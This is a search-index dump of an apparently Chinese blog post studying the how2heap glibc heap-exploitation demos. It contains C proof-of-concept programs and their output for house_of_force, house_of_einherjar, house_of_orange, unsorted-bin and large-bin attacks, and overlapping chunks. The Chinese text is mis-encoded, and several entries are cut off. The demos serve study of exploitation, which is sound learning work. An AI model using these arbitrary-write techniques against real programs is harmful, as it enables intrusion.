0x1; fprintf(stderr,\"\\nThis is a simple chunks overlapping problem\"); fprintf(stderr,\"\\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\\n\"); fprintf(stderr,\"\\nLet's start to allocate 5 chunks on the heap:\"); p1 = malloc(1000); p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); fprintf(stderr,\"\\n\\nchunk p1 from %p to %p\", p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr,\"\\nchunk p2 from %p to %p\", p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr,\"\\nchunk p3 from %p to %p\", p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr,\"\\nchunk p4 from %p to %p\", p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr,\"\\nchunk p5 from %p to %p\\n\", p5, (unsigned char *)p5+malloc_usable_size(p5)); memset(p1,'A',real_size_p1); memset(p2,'B',real_size_p2); memset(p3,'C',real_size_p3); memset(p4,'D',real_size_p4); memset(p5,'E',real_size_p5); fprintf(stderr,\"\\nLet's free the chunk p4.\\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\\n\"); free(p4); fprintf(stderr,\"\\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\\nwith the size of chunk_p2 + size of chunk_p3\\n\"); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //\u003c--- BUG HERE fprintf(stderr,\"\\nNow during the free() operation on p2, the allocator is fooled to think that \\nthe nextchunk is p4 (since p2 + size_p2 now point to p4) \\n\"); fprintf(stderr,\"\\nThis operation will basically create a big free chunk that wrongly includes p3\\n\"); free(p2); fprintf(stderr,\"\\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\\n\"); p6 = malloc(2000); real_size_p6 = malloc_usable_size(p6); fprintf(stderr,\"\\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \\nwe can overwrite data in p3 by writing on chunk p6\\n\"); fprintf(stderr,\"\\nchunk p6 from %p to %p\", p6, (unsigned char *)p6+real_size_p6); fprintf(stderr,\"\\nchunk p3 from %p to %p\\n\", p3, (unsigned char *) p3+real_size_p3); fprintf(stderr,\"\\nData inside chunk p3: \\n\\n\"); fprintf(stderr,\"%s\\n\",(char *)p3); fprintf(stderr,\"\\nLet's write something inside p6\\n\"); memset(p6,'F',1500); fprintf(stderr,\"\\nData inside chunk p3: \\n\\n\"); fprintf(stderr,\"%s\\n\",(char *)p3); } è¾“å‡ºï¼š This is a simple chunks overlapping problem This is also referenced as Nonadjacent Free Chunk Consolidation Attack Let's start to allocate 5 chunks on the heap: chunk p1 from 0x17c9010 to 0x17c93f8 chunk p2 from 0x17c9400 to 0x17c97e8 chunk p3 from 0x17c97f0 to 0x17c9bd8 chunk p4 from 0x17c9be0 to 0x17c9fc8 chunk p5 from 0x17c9fd0 to 0x17ca3b8 Let's free the chunk p4. In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4 Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2 with the size of chunk_p2 + size of chunk_p3 Now during the free() operation on p2, the allocator is fooled to think that the nextchunk is p4 (since p2 + size_p2 now point to p4) This operation will basically create a big free chunk that wrongly includes p3 Now let's allocate a new chunk with a size ","date":"2019-12-09","objectID":"/how2heap/:10:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"house_of_force æºç ï¼š /* This PoC works also with ASLR enabled. It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled. If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum (http://phrack.org/issues/66/10.html) Tested in Ubuntu 14.04, 64bit. */ #include \u003cstdio.h\u003e#include \u003cstdint.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e#include \u003cmalloc.h\u003e char bss_var[] =\"This is a string that we want to overwrite.\"; int main(int argc , char* argv[]) { fprintf(stderr,\"\\nWelcome to the House of Force\\n\\n\"); fprintf(stderr,\"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n\"); fprintf(stderr,\"The top chunk is a special chunk. Is the last in memory \" \"and is the chunk that will be resized when malloc asks for more space from the os.\\n\"); fprintf(stderr,\"\\nIn the end, we will use this to overwrite a variable at %p.\\n\", bss_var); fprintf(stderr,\"Its current value is: %s\\n\", bss_var); fprintf(stderr,\"\\nLet's allocate the first chunk, taking space from the wilderness.\\n\"); intptr_t *p1 = malloc(256); fprintf(stderr,\"The chunk of 256 bytes has been allocated at %p.\\n\", p1 - 2); fprintf(stderr,\"\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n\"); int real_size = malloc_usable_size(p1); fprintf(stderr,\"Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n\", real_size + sizeof(long)*2); fprintf(stderr,\"\\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\\n\"); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr,\"\\nThe top chunk starts at %p\\n\", ptr_top); fprintf(stderr,\"\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n\"); fprintf(stderr,\"Old size of top chunk %#llx\\n\", *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; fprintf(stderr,\"New size of top chunk %#llx\\n\", *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ fprintf(stderr,\"\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n\" \"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n\" \"overflow) and will then be able to allocate a chunk right over the desired region.\\n\"); /* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr,\"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n\" \"we will malloc %#lx bytes.\\n\", bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); fprintf(stderr,\"As expected, the new pointer is at the same place as the old top chunk: %p\\n\", new_ptr - sizeof(long)*2); void* ctr_chunk = malloc(100); fprintf(stderr,\"\\nNow, the next chunk we overwrite will point at our target buffer.\\n\"); fprintf(stderr,\"malloc(100) =\u003e %p!\\n\", ctr_chunk); fprintf(stderr,\"Now, we can finally overwrite that value:\\n\"); fprintf(stderr,\"... old string: %s\\n\", bss_var); fprintf(stderr,\"... doing strcpy overwrite with \\\"YEAH!!!\\\"...\\n\"); strcpy(ctr_chunk,\"YEAH!!!\"); fprintf(stderr,\"... new string: %s\\n\", bss_var); // some further discussion: //fprintf(stderr,\"This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n\"); //fprintf(stderr,\"This because the main_arena-\u003etop pointer is setted to current av-\u003etop + malloc_size \" // \"and we \\nwant to set th","date":"2019-12-09","objectID":"/how2heap/:11:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"unsorted_bin_into_stack æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstdint.h\u003e int main() { intptr_t stack_buffer[4] = {0}; fprintf(stderr,\"Allocating the victim chunk\\n\"); intptr_t* victim = malloc(0x100); fprintf(stderr,\"Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\\n\"); intptr_t* p1 = malloc(0x100); fprintf(stderr,\"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\", victim); free(victim); fprintf(stderr,\"Create a fake chunk on the stack\"); fprintf(stderr,\"Set size for next allocation and the bk pointer to any writable address\"); stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer; //------------VULNERABILITY----------- fprintf(stderr,\"Now emulating a vulnerability that can overwrite the victim-\u003esize and victim-\u003ebk pointer\\n\"); fprintf(stderr,\"Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (\u003e 16 on x64) \u0026\u0026 \u003cav-\u003esystem_mem\\n\"); victim[-1] = 32; victim[1] = (intptr_t)stack_buffer; // victim-\u003ebk is pointing to stack //------------------------------------ fprintf(stderr,\"Now next malloc will return the region of our fake chunk: %p\\n\", \u0026stack_buffer[2]); fprintf(stderr,\"malloc(0x100): %p\\n\", malloc(0x100)); } è¾“å‡ºï¼š Allocating the victim chunk Allocating another chunk to avoid consolidating the top chunk with the small one during the free() Freeing the chunk 0x2020010, it will be inserted in the unsorted bin Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-\u003esize and victim-\u003ebk pointer Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (\u003e 16 on x64) \u0026\u0026 \u003cav-\u003esystem_mem Now next malloc will return the region of our fake chunk: 0x7ffe82ca7160 malloc(0x100): 0x7ffe82ca7160 é¦–å…ˆåˆ†é…ä¸€ä¸ª 0x100 çš„ chunkvictimï¼Œåœ¨ä¸‹é¢å†å«ä¸€ä¸ª chunk é˜²æ­¢ä¸ top chunk åˆå¹¶ï¼Œé‡Šæ”¾ victim è¿›å…¥ unsorted binã€‚ç°åœ¨åœ¨æ ˆä¸Šä¼ªé€ å¤§å°ä¸º 0x110 çš„ chunkï¼Œå¹¶ä½¿å…¶ bk æŒ‡å‘ä»»æ„ä¸€ä¸ªå¯å†™åœ°å€ï¼Œæ¯”å¦‚è‡ªèº«ã€‚ å‡è®¾å­˜åœ¨æ¼æ´å¯ä»¥ä¿®æ”¹ victim çš„ chunk_size å’Œ bkï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å®ƒçš„ chunk_size æ”¹ä¸ºåˆæ³• nextsize èŒƒå›´å†…çš„ä¸€ä¸ªå€¼ï¼Œä¸”å°äº 0x100ã€‚è€Œ bk åˆ™æ”¹ä¸ºæˆ‘ä»¬åˆšæ‰ä¼ªé€ çš„ chunkã€‚è¿™æ ·ä¸‹ä¸€æ¬¡ malloc(0x100) å°±ä¼šé¡ºç€ bk æŸ¥æ‰¾ï¼Œé¦–å…ˆæ‰¾åˆ° victim ä½†å¤§å°ä¸å¤Ÿï¼Œæ”¾å…¥ small binã€‚éšåæ‰¾åˆ°æˆ‘ä»¬ä¼ªé€ çš„ chunk å¹¶è¿”å›ï¼Œæ­¤æ—¶ä¼ªé€  chunk çš„ fd å·²ç»æŒ‡å‘ main_arena+88ï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ² libcã€‚ ","date":"2019-12-09","objectID":"/how2heap/:12:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"unsorted_bin_attack æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main(){ fprintf(stderr,\"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\\n\"); fprintf(stderr,\"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack\\n\\n\"); unsigned long stack_var=0; fprintf(stderr,\"Let's first look at the target we want to rewrite on stack:\\n\"); fprintf(stderr,\"%p: %ld\\n\\n\", \u0026stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr,\"Now, we allocate first normal chunk on the heap at: %p\\n\",p); fprintf(stderr,\"And allocate another normal chunk in order to avoid consolidating the top chunk with\" \"the first one during the free()\\n\\n\"); malloc(500); free(p); fprintf(stderr,\"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer \" \"point to %p\\n\",(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(\u0026stack_var-2); fprintf(stderr,\"Now emulating a vulnerability that can overwrite the victim-\u003ebk pointer\\n\"); fprintf(stderr,\"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\\n\\n\",(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr,\"Let's malloc again to get the chunk we just free. During this time, the target should have already been\" \"rewritten:\\n\"); fprintf(stderr,\"%p: %p\\n\", \u0026stack_var, (void*)stack_var); } è¾“å‡ºï¼š This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let's first look at the target we want to rewrite on stack: 0x7fff4c4511e8: 0 Now, we allocate first normal chunk on the heap at: 0x1023010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f60208a2b78 Now emulating a vulnerability that can overwrite the victim-\u003ebk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff4c4511d8 Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten: 0x7fff4c4511e8: 0x7f60208a2b78 å’Œä¸Šä¸€ä¸ªç±»ä¼¼ï¼Œæˆ‘ä»¬çœ‹åˆ°åœ¨ free(p1) åï¼Œå…¶ bk æŒ‡å‘ main_arena+88ã€‚å‡è®¾å­˜åœ¨æ¼æ´å¯ä»¥ä¿®æ”¹å…¶ bkï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¿®æ”¹æˆç›®æ ‡åœ°å€ - 0x10 çš„ä½ç½®ï¼Œç›¸å½“äºä¼ªé€ äº†ä¸€ä¸ª fake chunkã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨æ‹¿å› p1 çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ fake chunk ä¼šè¢«è®¤ä¸ºæ˜¯ unsorted bin ä¸­çš„ä¸‹ä¸€ä¸ª chunkï¼Œå› æ­¤å…¶ bk ä¹Ÿè¢«ä¿®æ”¹ä¸º main_arena+88ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨æ ˆä¸Šå†™å…¥äº†ä¸€ä¸ª unsigned long å€¼ã€‚ ","date":"2019-12-09","objectID":"/how2heap/:13:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"large_bin_attack æºç ï¼š /* This technique is taken from https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/ [...] else { victim-\u003efd_nextsize = fwd; victim-\u003ebk_nextsize = fwd-\u003ebk_nextsize; fwd-\u003ebk_nextsize = victim; victim-\u003ebk_nextsize-\u003efd_nextsize = victim; } bck = fwd-\u003ebk; [...] mark_bin (av, victim_index); victim-\u003ebk = bck; victim-\u003efd = fwd; fwd-\u003ebk = victim; bck-\u003efd = victim; For more details on how large-bins are handled and sorted by ptmalloc, please check the Background section in the aforementioned link. [...] */ #include\u003cstdio.h\u003e#include\u003cstdlib.h\u003e int main() { fprintf(stderr,\"This file demonstrates large bin attack by writing a large unsigned long value into stack\\n\"); fprintf(stderr,\"In practice, large bin attack is generally prepared for further attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack\\n\\n\"); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr,\"Let's first look at the targets we want to rewrite on stack:\\n\"); fprintf(stderr,\"stack_var1 (%p): %ld\\n\", \u0026stack_var1, stack_var1); fprintf(stderr,\"stack_var2 (%p): %ld\\n\\n\", \u0026stack_var2, stack_var2); unsigned long *p1 = malloc(0x320); fprintf(stderr,\"Now, we allocate the first large chunk on the heap at: %p\\n\", p1 - 2); fprintf(stderr,\"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\" \"the first large chunk during the free()\\n\\n\"); malloc(0x20); unsigned long *p2 = malloc(0x400); fprintf(stderr,\"Then, we allocate the second large chunk on the heap at: %p\\n\", p2 - 2); fprintf(stderr,\"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\" \"the second large chunk during the free()\\n\\n\"); malloc(0x20); unsigned long *p3 = malloc(0x400); fprintf(stderr,\"Finally, we allocate the third large chunk on the heap at: %p\\n\", p3 - 2); fprintf(stderr,\"And allocate another fastbin chunk in order to avoid consolidating the top chunk with\" \"the third large chunk during the free()\\n\\n\"); malloc(0x20); free(p1); free(p2); fprintf(stderr,\"We free the first and second large chunks now and they will be inserted in the unsorted bin:\" \"[%p \u003c--\u003e %p ]\\n\\n\", (void *)(p2 - 2), (void *)(p2[0])); malloc(0x90); fprintf(stderr,\"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the\" \"freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation\" \", and reinsert the remaining of the freed first large chunk into the unsorted bin:\" \"[%p]\\n\\n\", (void *)((char *)p1 + 0x90)); free(p3); fprintf(stderr,\"Now, we free the third large chunk and it will be inserted in the unsorted bin:\" \"[%p \u003c--\u003e %p ]\\n\\n\", (void *)(p3 - 2), (void *)(p3[0])); //------------VULNERABILITY----------- fprintf(stderr,\"Now emulating a vulnerability that can overwrite the freed second large chunk's \\\"size\\\"\" \"as well as its \\\"bk\\\"and \\\"bk_nextsize\\\"pointers\\n\"); fprintf(stderr,\"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk\" \"at the head of the large bin freelist. To overwrite the stack variables, we set \\\"bk\\\"to 16 bytes before stack_var1 and\" \"\\\"bk_nextsize\\\"to 32 bytes before stack_var2\\n\\n\"); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(\u0026stack_var1 - 2); p2[3] = (unsigned long)(\u0026stack_var2 - 4); //------------------------------------ malloc(0x90); fprintf(stderr,\"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist.\" \"During this time, targets should have already been rewritten:\\n\"); fprintf(stderr,\"stack_var1 (%p): %p\\n\", \u0026stack_var1, (void *)stack_var1); fprintf(stderr,\"stack_var2 (%p): %p\\n\", \u0026stack_var2, (void *)stack_var2); return 0; } è¾“å‡ºï¼š This file demonstrates large bin attack by writing a large unsigned long value into stack In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_m","date":"2019-12-09","objectID":"/how2heap/:14:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"house_of_einherjar æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e#include \u003cmalloc.h\u003e /* Credit to st4g3r for publishing this technique The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc() This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. */ int main() { fprintf(stderr,\"Welcome to House of Einherjar!\\n\"); fprintf(stderr,\"Tested in Ubuntu 16.04 64bit.\\n\"); fprintf(stderr,\"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\\n\"); uint8_t* a; uint8_t* b; uint8_t* d; fprintf(stderr,\"\\nWe allocate 0x38 bytes for 'a'\\n\"); a = (uint8_t*) malloc(0x38); fprintf(stderr,\"a: %p\\n\", a); int real_a_size = malloc_usable_size(a); fprintf(stderr,\"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\\n\", real_a_size); // create a fake chunk fprintf(stderr,\"\\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\\n\"); fprintf(stderr,\"However, you can also create the chunk in the heap or the bss, as long as you know its address\\n\"); fprintf(stderr,\"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n\"); fprintf(stderr,\"(although we could do the unsafe unlink technique here in some scenarios)\\n\"); size_t fake_chunk[6]; fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P-\u003ebk-\u003esize == P-\u003eprev_size fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin fake_chunk[2] = (size_t) fake_chunk; // fwd fake_chunk[3] = (size_t) fake_chunk; // bck fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize fprintf(stderr,\"Our fake chunk at %p looks like:\\n\", fake_chunk); fprintf(stderr,\"prev_size (not used): %#lx\\n\", fake_chunk[0]); fprintf(stderr,\"size: %#lx\\n\", fake_chunk[1]); fprintf(stderr,\"fwd: %#lx\\n\", fake_chunk[2]); fprintf(stderr,\"bck: %#lx\\n\", fake_chunk[3]); fprintf(stderr,\"fwd_nextsize: %#lx\\n\", fake_chunk[4]); fprintf(stderr,\"bck_nextsize: %#lx\\n\", fake_chunk[5]); /* In this case it is easier if the chunk size attribute has a least significant byte with * a value of 0x00. The least significant byte of this will be 0x00, because the size of * the chunk includes the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); fprintf(stderr,\"\\nWe allocate 0xf8 bytes for 'b'.\\n\"); fprintf(stderr,\"b: %p\\n\", b); uint64_t* b_size_ptr = (uint64_t*)(b - 8); /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/ fprintf(stderr,\"\\nb.size: %#lx\\n\", *b_size_ptr); fprintf(stderr,\"b.size is: (0x100) | prev_inuse = 0x101\\n\"); fprintf(stderr,\"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"); a[real_a_size] = 0; fprintf(stderr,\"b.size: %#lx\\n\", *b_size_ptr); fprintf(stderr,\"This is easiest if b.size is a multiple of 0x100 so you \" \"don't change the size of b, only its prev_inuse bit\\n\"); fprintf(stderr,\"If it had been modified, we would need a fake chunk inside \" \"b where it will try to consolidate the next chunk\\n\"); // Write a fake prev_size to the end of a fprintf(stderr,\"\\nWe write a fake prev_size to the last %lu bytes of a so that \" \"it will consolidate with our fake chunk\\n\", sizeof(size_t)); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); fprintf(stderr,\"Our fake prev_size will be %p - %p = %#lx\\n\", b-sizeof(size_t)*2, fake_chunk, fake_size); *(size_t*)\u0026a[real_a_size-sizeof(size_t)] = fake_size; //Change the fake chunk's size to reflect b's new prev_size fprintf(stderr,\"\\nModify fake chunk's size to reflect b's new prev_size\\n\"); fake_chunk[1] = fake_size; // free b and it will consolidate with our fake chunk fprintf(stderr,\"Now we free ","date":"2019-12-09","objectID":"/how2heap/:15:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"house_of_orange æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e /* The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer It requires a leak of the heap and the libc Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html */ /* This function is just present to emulate the scenario where the address of the function system is known. */ int winner (char *ptr); int main() { /* The House of Orange starts with the assumption that a buffer overflow exists on the heap using which the Top (also called the Wilderness) chunk can be corrupted. At the beginning of execution, the entire heap is part of the Top chunk. The first allocations are usually pieces of the Top chunk that are broken off to service the request. Thus, with every allocation, the Top chunks keeps getting smaller. And in a situation where the size of the Top chunk is smaller than the requested value, there are two possibilities: 1) Extend the Top chunk 2) Mmap a new page If the size requested is smaller than 0x21000, then the former is followed. */ char *p1, *p2; size_t io_list_all, *top; fprintf(stderr,\"The attack vector of this technique was removed by changing the behavior of malloc_printerr, \" \"which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\\n\"); fprintf(stderr,\"Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,\" \"https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\\n\"); /* Firstly, lets allocate a chunk on the heap. */ p1 = malloc(0x400-16); /* The heap is usually allocated with a top chunk of size 0x21000 Since we've allocate a chunk of size 0x400 already, what's left is 0x20c00 with the PREV_INUSE bit set =\u003e 0x20c01. The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap, it must also be page aligned at the end. Also, if a chunk that is adjacent to the Top chunk is to be freed, then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set. So that means that there are two conditions that must always be true. 1) Top chunk + size has to be page aligned 2) Top chunk's prev_inuse bit has to be set. We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE. What's left is 0x20c01 Now, let's satisfy the conditions 1) Top chunk + size has to be page aligned 2) Top chunk's prev_inuse bit has to be set. */ top = (size_t *) ((char *) p1 + 0x400 - 16); top[1] = 0xc01; /* Now we request a chunk of size larger than the size of the Top chunk. Malloc tries to service this request by extending the Top chunk This forces sysmalloc to be invoked. In the usual scenario, the heap looks like the following |------------|------------|------...----| | chunk | chunk | Top ... | |------------|------------|------...----| heap start heap end And the new area that gets allocated is contiguous to the old heap end. So the new size of the Top chunk is the sum of the old size and the newly allocated size. In order to keep track of this change in size, malloc uses a fencepost chunk, which is basically a temporary chunk. After the size of the Top chunk has been updated, this chunk gets freed. In our scenario however, the heap looks like |------------|------------|------..--|--...--|---------| | chunk | chunk | Top .. | ... | new Top | |------------|------------|------..--|--...--|---------| heap start heap end In this situation, the new Top will be starting from an address that is adjacent to the heap end. So the area between the second chunk and the heap end is unused. And the old Top chunk gets freed. Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes, it gets added to list of unsorted bins. Now we request a chunk of size larger than the size of the top chunk. This forces sysmalloc to be invoked. And ultimately invokes _int_free Finally the heap looks like this: ","date":"2019-12-09","objectID":"/how2heap/:16:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"calc_tcache_size æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cmalloc.h\u003e struct malloc_chunk { size_t mchunk_prev_size; /* Size of previous chunk (if free). */ size_t mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; /* The corresponding word size. */ #define SIZE_SZ (sizeof (size_t)) #define MALLOC_ALIGNMENT (2 * SIZE_SZ \u003c __alignof__ (long double) \\ ? __alignof__ (long double) : 2 * SIZE_SZ) /* The corresponding bit mask value. */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) /* The smallest size we can malloc is an aligned minimal chunk */ #define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK)) #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u003cMINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK) /* When \"x\" is from chunksize(). */ # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT) /* When \"x\" is a user-provided size. */ # define usize2tidx(x) csize2tidx (request2size (x)) int main() { unsigned long long req; unsigned long long tidx; fprintf(stderr,\"This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.\\n\"); fprintf(stderr,\"The basic formula is as follows:\\n\"); fprintf(stderr,\"\\t(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT\\n\"); fprintf(stderr,\"\\tOn a 64 bit system the current values are:\\n\"); fprintf(stderr,\"\\t\\tMINSIZE: 0x%lx\\n\", MINSIZE); fprintf(stderr,\"\\t\\tMALLOC_ALIGNMENT: 0x%lx\\n\", MALLOC_ALIGNMENT); fprintf(stderr,\"\\tSo we get the following equation:\\n\"); fprintf(stderr,\"\\t(IDX = CHUNKSIZE - 0x%lx) / 0x%lx\\n\\n\", MINSIZE-MALLOC_ALIGNMENT+1, MALLOC_ALIGNMENT); fprintf(stderr,\"BUT be AWARE that CHUNKSIZE is not the x in malloc(x)\\n\"); fprintf(stderr,\"It is calculated as follows:\\n\"); fprintf(stderr,\"\\tIF x \u003cMINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)\\n\", MINSIZE, MINSIZE); fprintf(stderr,\"\\tELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK) \\n\"); fprintf(stderr,\"\\t=\u003e CHUNKSIZE = (x + 0x%lx + 0x%lx) \u0026 ~0x%lx)\\n\\n\\n\", SIZE_SZ, MALLOC_ALIGN_MASK, MALLOC_ALIGN_MASK); while(1) { fprintf(stderr,\"[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): \"); scanf(\"%llx\", \u0026req); tidx = usize2tidx(req); if (tidx\u003e 63) { fprintf(stderr,\"\\nWARNING: NOT IN TCACHE RANGE!\\n\"); } 